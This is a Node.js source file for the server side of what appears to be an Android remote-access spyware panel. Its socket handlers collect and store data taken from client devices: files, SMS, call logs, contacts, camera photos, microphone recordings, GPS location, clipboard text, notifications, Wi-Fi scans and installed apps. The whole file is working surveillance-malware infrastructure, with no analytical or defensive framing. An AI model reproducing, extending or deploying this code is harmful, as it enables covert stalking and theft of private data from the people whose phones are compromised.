// Socket Event Handlers Module
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');

class SocketEventHandlers {
    constructor(config, logManager) {
        this.config = config;
        this.logManager = logManager;
    }

    setupFileHandler(socket, clientID, client) {
        // Storage for chunked transfers
        if (!this.activeTransfers) {
            this.activeTransfers = new Map();
        }
        
        socket.on(this.config.messageKeys.files, (data = {}) => {
            const nowIso = new Date().toISOString();
            
            this.logManager.log(this.config.logTypes.info, `${clientID} File handler received data type: ${data.type}`);
            
            if (data.type === "list") {
                const list = Array.isArray(data.list) ? data.list : [];

                client.set('currentFolder', list).write();

                client.get('fileStatus').assign({
                    lastError: null,
                    lastUpdated: nowIso,
                    lastPath: data.path || null
                }).write();

                this.logManager.log(this.config.logTypes.success, `${clientID} File List Updated (${list.length} items)`);

            } else if (data.type === "download") {
                this.logManager.log(this.config.logTypes.info, `Receiving File From ${clientID}: ${data.name || 'unknown'}`);
                
                if (!data.buffer) {
                    this.logManager.log(this.config.logTypes.error, `${clientID} No buffer data received`);
                    return;
                }
                
                const bufferSize = typeof data.buffer === 'string' ? data.buffer.length : 
                                 Buffer.isBuffer(data.buffer) ? data.buffer.length : 
                                 data.buffer && data.buffer.data ? data.buffer.data.length : 'unknown';
                
                this.logManager.log(this.config.logTypes.info, `${clientID} Buffer size: ${bufferSize}`);

                let hash = crypto.createHash('md5').update(new Date() + Math.random()).digest("hex");
                let fileKey = hash.substr(0, 5) + "-" + hash.substr(5, 4) + "-" + hash.substr(9, 5);
                let fileExt = (data.name.substring(data.name.lastIndexOf(".")).length !== data.name.length) 
                    ? data.name.substring(data.name.lastIndexOf(".")) : '.unknown';

                let filePath = path.join(this.config.downloadsFullPath, fileKey + fileExt);

                try {
                    // Convert Base64 string to Buffer if needed
                    let fileBuffer;
                    if (typeof data.buffer === 'string') {
                        // It's a Base64 string, convert to Buffer
                        fileBuffer = Buffer.from(data.buffer, 'base64');
                    } else if (Buffer.isBuffer(data.buffer)) {
                        // It's already a Buffer
                        fileBuffer = data.buffer;
                    } else if (data.buffer && data.buffer.data && Array.isArray(data.buffer.data)) {
                        // It's a Buffer-like object with data array
                        fileBuffer = Buffer.from(data.buffer.data);
                    } else {
                        throw new Error('Invalid buffer format');
                    }

                    fs.writeFile(filePath, fileBuffer, (error) => {
                        if (!error) {
                            client.get('downloads').push({
                                time: new Date(),
                                type: "download",
                                originalName: data.name,
                                path: this.config.downloadsFolder + '/' + fileKey + fileExt
                            }).write();
                            this.logManager.log(this.config.logTypes.success, "File From " + clientID + " Saved");
                            client.get('fileStatus').assign({
                                lastError: null,
                                lastUpdated: nowIso,
                                lastPath: data.path || null
                            }).write();
                        } else {
                            this.logManager.log(this.config.logTypes.error, `File save error for ${clientID}: ${error.message}`);
                            client.get('fileStatus').assign({
                                lastError: `File save failed: ${error.message}`,
                                lastUpdated: nowIso,
                                lastPath: data.path || null
                            }).write();
                        }
                    });
                } catch (bufferError) {
                    this.logManager.log(this.config.logTypes.error, `Buffer conversion error for ${clientID}: ${bufferError.message}`);
                    client.get('fileStatus').assign({
                        lastError: `Buffer conversion failed: ${bufferError.message}`,
                        lastUpdated: nowIso,
                        lastPath: data.path || null
                    }).write();
                }
            } else if (data.type === "download_start") {
                this.logManager.log(this.config.logTypes.info, `${clientID} Starting chunked download: ${data.name}`);
                
                // Initialize chunked transfer
                const transferId = data.transferId;
                this.activeTransfers.set(transferId, {
                    clientID,
                    fileName: data.name,
                    filePath: data.path,
                    totalChunks: data.totalChunks,
                    totalSize: data.totalSize,
                    receivedChunks: [],
                    startTime: Date.now()
                });
                
            } else if (data.type === "download_chunk") {
                const transferId = data.transferId;
                const transfer = this.activeTransfers.get(transferId);
                
                if (transfer) {
                    transfer.receivedChunks[data.chunkIndex] = data.chunkData;
                    this.logManager.log(this.config.logTypes.info, 
                        `${clientID} Received chunk ${data.chunkIndex + 1}/${transfer.totalChunks}`);
                }
                
            } else if (data.type === "download_end") {
                const transferId = data.transferId;
                const transfer = this.activeTransfers.get(transferId);
                
                if (transfer) {
                    this.logManager.log(this.config.logTypes.info, `${clientID} Completing chunked download`);
                    
                    try {
                        // Reconstruct the full base64 string
                        const fullBase64 = transfer.receivedChunks.join('');
                        
                        // Convert to buffer and save
                        const fileBuffer = Buffer.from(fullBase64, 'base64');
                        
                        let hash = crypto.createHash('md5').update(new Date() + Math.random()).digest("hex");
                        let fileKey = hash.substr(0, 5) + "-" + hash.substr(5, 4) + "-" + hash.substr(9, 5);
                        let fileExt = (transfer.fileName.substring(transfer.fileName.lastIndexOf(".")).length !== transfer.fileName.length) 
                            ? transfer.fileName.substring(transfer.fileName.lastIndexOf(".")) : '.unknown';

                        let filePath = path.join(this.config.downloadsFullPath, fileKey + fileExt);
                        
                        fs.writeFile(filePath, fileBuffer, (error) => {
                            if (!error) {
                                client.get('downloads').push({
                                    time: new Date(),
                                    type: "download",
                                    originalName: transfer.fileName,
                                    path: this.config.downloadsFolder + '/' + fileKey + fileExt
                                }).write();
                                this.logManager.log(this.config.logTypes.success, 
                                    `${clientID} Chunked file saved: ${transfer.fileName}`);
                                client.get('fileStatus').assign({
                                    lastError: null,
                                    lastUpdated: nowIso,
                                    lastPath: transfer.filePath
                                }).write();
                            } else {
                                this.logManager.log(this.config.logTypes.error, 
                                    `${clientID} Chunked file save error: ${error.message}`);
                            }
                        });
                        
                    } catch (error) {
                        this.logManager.log(this.config.logTypes.error, 
                            `${clientID} Chunked transfer reconstruction error: ${error.message}`);
                    }
                    
                    // Clean up transfer
                    this.activeTransfers.delete(transferId);
                }
                
            } else if (data.type === "error") {
                const message = typeof data.error === 'string' ? data.error : 'Unknown file explorer error';
                client.get('fileStatus').assign({
                    lastError: message,
                    lastUpdated: nowIso,
                    lastPath: data.path || null
                }).write();
                this.logManager.log(this.config.logTypes.error, `${clientID} File Explorer Error - ${message}`);
            }
        });
    }

    setupCallHandler(socket, clientID, client) {
        socket.on(this.config.messageKeys.call, (data) => {
            if (data.callsList) {
                if (data.callsList.length !== 0) {
                    let callsList = data.callsList;
                    let dbCall = client.get('CallData');
                    let newCount = 0;
                    callsList.forEach(call => {
                        let hash = crypto.createHash('md5').update(call.phoneNo + call.date).digest("hex");
                        if (dbCall.find({ hash }).value() === undefined) {
                            call.hash = hash;
                            dbCall.push(call).write();
                            newCount++;
                        }
                    });
                    this.logManager.log(this.config.logTypes.success, clientID + " Call Log Updated - " + newCount + " New Calls");
                }
            }
        });
    }

    setupSmsHandler(socket, clientID, client) {
        socket.on(this.config.messageKeys.sms, (data) => {
            const nowIso = new Date().toISOString();
            if (data && typeof data === "object" && !Array.isArray(data)) {
                if (typeof data.error === 'string' && data.error.length) {
                    client.get('smsStatus').assign({
                        lastError: data.error,
                        lastUpdated: nowIso
                    }).write();
                    this.logManager.log(this.config.logTypes.error, `${clientID} SMS Error - ${data.error}`);
                    return;
                }

                const smsList = Array.isArray(data.smslist) ? data.smslist : [];
                let dbSMS = client.get('SMSData');
                let newCount = 0;
                smsList.forEach(sms => {
                    let hash = crypto.createHash('md5').update((sms.address || '') + (sms.body || '')).digest("hex");
                    if (dbSMS.find({ hash }).value() === undefined) {
                        sms.hash = hash;
                        dbSMS.push(sms).write();
                        newCount++;
                    }
                });

                client.get('smsStatus').assign({
                    lastError: null,
                    lastUpdated: nowIso,
                    itemCount: smsList.length,
                    truncated: Boolean(data.truncated)
                }).write();

                this.logManager.log(this.config.logTypes.success, `${clientID} SMS List Updated (+${newCount})`);

                if (!smsList.length) {
                    this.logManager.log(this.config.logTypes.info, `${clientID} SMS List Empty (check READ_SMS permission)`);
                }
            } else if (typeof data === "boolean") {
                this.logManager.log(this.config.logTypes.success, clientID + " SENT SMS");
            }
        });
    }

    setupCameraHandler(socket, clientID, client) {
        socket.on(this.config.messageKeys.camera, (data = {}) => {
            try {
                if (data.camList) {
                    const list = Array.isArray(data.list) ? data.list : [];
                    client.get('availableCameras').assign(list).write();
                    this.logManager.log(this.config.logTypes.success, `${clientID} Camera List Updated`);
                } else if (data.image) {
                    const buffer = this.decodeCameraBuffer(data.buffer);
                    if (!buffer || !buffer.length) {
                        this.logManager.log(this.config.logTypes.error, `${clientID} Camera Image Empty`);
                        return;
                    }

                    const clientPhotoDir = path.join(this.config.photosFullPath, clientID);
                    if (!fs.existsSync(clientPhotoDir)) {
                        fs.mkdirSync(clientPhotoDir, { recursive: true });
                    }

                    const hash = crypto.createHash('md5').update(new Date() + Math.random().toString()).digest("hex");
                    const fileName = `${Date.now()}-${hash.substr(0, 8)}.jpg`;
                    const filePath = path.join(clientPhotoDir, fileName);

                    fs.writeFile(filePath, buffer, (error) => {
                        if (error) {
                            this.logManager.log(this.config.logTypes.error, `${clientID} Camera Save Failed`);
                            console.error(error);
                            return;
                        }

                        const relativePath = `${this.config.photosFolder}/${clientID}/${fileName}`.replace(/\\/g, '/');
                        const shotRecord = {
                            time: data.timestamp || Date.now(),
                            cameraId: Object.prototype.hasOwnProperty.call(data, 'cameraId') ? data.cameraId : null,
                            fileName,
                            path: relativePath,
                            size: buffer.length
                        };
                        client.get('cameraShots').push(shotRecord).write();
                        this.logManager.log(this.config.logTypes.success, `${clientID} Camera Image Saved`);
                    });
                } else if (data.error) {
                    this.logManager.log(this.config.logTypes.error, `${clientID} Camera Error - ${data.error}`);
                }
            } catch (err) {
                this.logManager.log(this.config.logTypes.error, `${clientID} Camera Handler Exception`);
                console.error(err);
            }
        });
    }

    decodeCameraBuffer(rawBuffer) {
        if (!rawBuffer) return null;
        if (Buffer.isBuffer(rawBuffer)) return rawBuffer;
        if (typeof rawBuffer === 'string') {
            try {
                return Buffer.from(rawBuffer, 'base64');
            } catch (err) {
                console.error('Camera buffer base64 decode failed', err);
                return null;
            }
        }
        if (rawBuffer.data && Array.isArray(rawBuffer.data)) {
            return Buffer.from(rawBuffer.data);
        }
        return null;
    }

    setupMicHandler(socket, clientID, client) {
        socket.on(this.config.messageKeys.mic, (data) => {
            if (data.file) {
                this.logManager.log(this.config.logTypes.info, "Receiving " + data.name + " from " + clientID);

                let hash = crypto.createHash('md5').update(new Date() + Math.random()).digest("hex");
                let fileKey = hash.substr(0, 5) + "-" + hash.substr(5, 4) + "-" + hash.substr(9, 5);
                let fileExt = (data.name.substring(data.name.lastIndexOf(".")).length !== data.name.length) 
                    ? data.name.substring(data.name.lastIndexOf(".")) : '.unknown';

                let filePath = path.join(this.config.downloadsFullPath, fileKey + fileExt);

                try {
                    // Convert Base64 string to Buffer if needed
                    let fileBuffer;
                    if (typeof data.buffer === 'string') {
                        fileBuffer = Buffer.from(data.buffer, 'base64');
                    } else if (Buffer.isBuffer(data.buffer)) {
                        fileBuffer = data.buffer;
                    } else if (data.buffer && data.buffer.data && Array.isArray(data.buffer.data)) {
                        fileBuffer = Buffer.from(data.buffer.data);
                    } else {
                        throw new Error('Invalid buffer format');
                    }

                    fs.writeFile(filePath, fileBuffer, (e) => {
                        if (!e) {
                            client.get('downloads').push({
                                "time": new Date(),
                                "type": "voiceRecord",
                                "originalName": data.name,
                                "path": this.config.downloadsFolder + '/' + fileKey + fileExt
                            }).write();
                        } else {
                            this.logManager.log(this.config.logTypes.error, `Voice file save error: ${e.message}`);
                        }
                    });
                } catch (bufferError) {
                    this.logManager.log(this.config.logTypes.error, `Voice buffer conversion error: ${bufferError.message}`);
                }
            }
        });
    }

    setupLocationHandler(socket, clientID, client) {
        socket.on(this.config.messageKeys.location, (data) => {
            if (Object.keys(data).length !== 0 && data.hasOwnProperty("latitude") && data.hasOwnProperty("longitude")) {
                client.get('GPSData').push({
                    time: new Date(),
                    enabled: data.enabled || false,
                    latitude: data.latitude || 0,
                    longitude: data.longitude || 0,
                    altitude: data.altitude || 0,
                    accuracy: data.accuracy || 0,
                    speed: data.speed || 0
                }).write();
                this.logManager.log(this.config.logTypes.success, clientID + " GPS Updated");
            } else {
                this.logManager.log(this.config.logTypes.error, clientID + " GPS Received No Data");
                this.logManager.log(this.config.logTypes.error, clientID + " GPS LOCATION SOCKET DATA" + JSON.stringify(data));
            }
        });
    }

    setupClipboardHandler(socket, clientID, client) {
        socket.on(this.config.messageKeys.clipboard, (data = {}) => {
            const content = data.text;
            const now = new Date();

            if (typeof content === 'string' && content.length) {
                client.get('clipboardLog').push({
                    time: now,
                    content
                }).write();
                client.get('clipboardStatus').assign({
                    lastUpdated: now.toISOString(),
                    lastError: null
                }).write();
                this.logManager.log(this.config.logTypes.info, clientID + " ClipBoard Received");
            } else {
                client.get('clipboardStatus').assign({
                    lastError: 'Clipboard event received without text',
                    lastUpdated: now.toISOString()
                }).write();
                this.logManager.log(this.config.logTypes.alert, clientID + " Clipboard event empty");
            }
        });
    }

    setupNotificationHandler(socket, clientID, client) {
        socket.on(this.config.messageKeys.notification, (data) => {
            let dbNotificationLog = client.get('notificationLog');
            let hash = crypto.createHash('md5').update(data.key + data.content).digest("hex");

            if (dbNotificationLog.find({ hash }).value() === undefined) {
                data.hash = hash;
                dbNotificationLog.push(data).write();
                this.logManager.log(this.config.logTypes.info, clientID + " Notification Received");
            }
        });
    }

    setupContactsHandler(socket, clientID, client) {
        socket.on(this.config.messageKeys.contacts, (data) => {
            if (data.contactsList) {
                if (data.contactsList.length !== 0) {
                    let contactsList = data.contactsList;
                    let dbContacts = client.get('contacts');
                    let newCount = 0;
                    contactsList.forEach(contact => {
                        contact.phoneNo = contact.phoneNo.replace(/\s+/g, '');
                        let hash = crypto.createHash('md5').update(contact.phoneNo + contact.name).digest("hex");
                        if (dbContacts.find({ hash }).value() === undefined) {
                            contact.hash = hash;
                            dbContacts.push(contact).write();
                            newCount++;
                        }
                    });
                    this.logManager.log(this.config.logTypes.success, clientID + " Contacts Updated - " + newCount + " New Contacts Added");
                }
            }
        });
    }

    setupWifiHandler(socket, clientID, client) {
        socket.on(this.config.messageKeys.wifi, (data = {}) => {
            const nowIso = new Date().toISOString();
            if (Array.isArray(data.networks)) {
                const networks = data.networks;
                let dbwifiLog = client.get('wifiLog');
                client.set('wifiNow', networks).write();
                let newCount = 0;
                networks.forEach(wifi => {
                    let wifiField = dbwifiLog.find({ SSID: wifi.SSID, BSSID: wifi.BSSID });
                    if (wifiField.value() === undefined) {
                        wifi.firstSeen = new Date();
                        wifi.lastSeen = new Date();
                        dbwifiLog.push(wifi).write();
                        newCount++;
                    } else {
                        wifiField.assign({
                            lastSeen: new Date()
                        }).write();
                    }
                });

                client.get('wifiStatus').assign({
                    lastError: null,
                    lastUpdated: nowIso,
                    networkCount: networks.length,
                    scanRequested: Boolean(data.scanRequested),
                    lastScanTimestamp: data.timestamp || null,
                    locationEnabled: data.locationEnabled !== undefined ? data.locationEnabled : null,
                    hasFineLocation: data.hasFineLocation !== undefined ? data.hasFineLocation : null,
                    hasCoarseLocation: data.hasCoarseLocation !== undefined ? data.hasCoarseLocation : null
                }).write();

                this.logManager.log(this.config.logTypes.success, `${clientID} WiFi Updated (${networks.length} networks, +${newCount})`);

                if (!networks.length) {
                    this.logManager.log(this.config.logTypes.info, `${clientID} WiFi scan returned no networks (check location/Wi-Fi state)`);
                }
            } else if (data && data.error) {
                const message = typeof data.error === 'string' ? data.error : 'WiFi manager error';
                client.get('wifiStatus').assign({
                    lastError: message,
                    lastUpdated: nowIso,
                    networkCount: 0,
                    scanRequested: Boolean(data.scanRequested),
                    lastScanTimestamp: data.timestamp || null,
                    locationEnabled: data.locationEnabled !== undefined ? data.locationEnabled : null,
                    hasFineLocation: data.hasFineLocation !== undefined ? data.hasFineLocation : null,
                    hasCoarseLocation: data.hasCoarseLocation !== undefined ? data.hasCoarseLocation : null
                }).write();
                this.logManager.log(this.config.logTypes.error, `${clientID} WiFi Error - ${message}`);
            }
        });
    }

    setupPermissionsHandler(socket, clientID, client) {
        socket.on(this.config.messageKeys.permissions, (data) => {
            client.get('enabledPermissions').assign(data.permissions).write();
            this.logManager.log(this.config.logTypes.success, clientID + " Permissions Updated");
        });
    }

    setupAppsHandler(socket, clientID, client) {
        socket.on(this.config.messageKeys.installed, (data) => {
            const nowIso = new Date().toISOString();
            if (data && typeof data.error === 'string') {
                client.get('appsStatus').assign({
                    lastError: data.error,
                    lastUpdated: nowIso,
                    appCount: 0,
                    includeSystem: data.includeSystem,
                    totalPackages: data.totalPackages,
                    returnedPackages: data.returnedPackages
                }).write();
                this.logManager.log(this.config.logTypes.error, `${clientID} Apps Error - ${data.error}`);
                return;
            }

            const apps = Array.isArray(data.apps) ? data.apps : [];
            client.get('apps').assign(apps).write();
            client.get('appsStatus').assign({
                lastError: null,
                lastUpdated: nowIso,
                appCount: apps.length,
                includeSystem: data.includeSystem,
                totalPackages: data.totalPackages,
                returnedPackages: data.returnedPackages,
                filtered: data.filtered
            }).write();
            this.logManager.log(this.config.logTypes.success, `${clientID} Apps Updated (${apps.length})`);
            if (!apps.length) {
                this.logManager.log(this.config.logTypes.info, `${clientID} Apps list empty`);
            }
        });
    }

    // Setup all handlers at once
    setupAllHandlers(socket, clientID, client) {
        this.setupFileHandler(socket, clientID, client);
        this.setupCallHandler(socket, clientID, client);
        this.setupSmsHandler(socket, clientID, client);
        this.setupCameraHandler(socket, clientID, client);
        this.setupMicHandler(socket, clientID, client);
        this.setupLocationHandler(socket, clientID, client);
        this.setupClipboardHandler(socket, clientID, client);
        this.setupNotificationHandler(socket, clientID, client);
        this.setupContactsHandler(socket, clientID, client);
        this.setupWifiHandler(socket, clientID, client);
        this.setupPermissionsHandler(socket, clientID, client);
        this.setupAppsHandler(socket, clientID, client);
    }
}

module.exports = SocketEventHandlers;
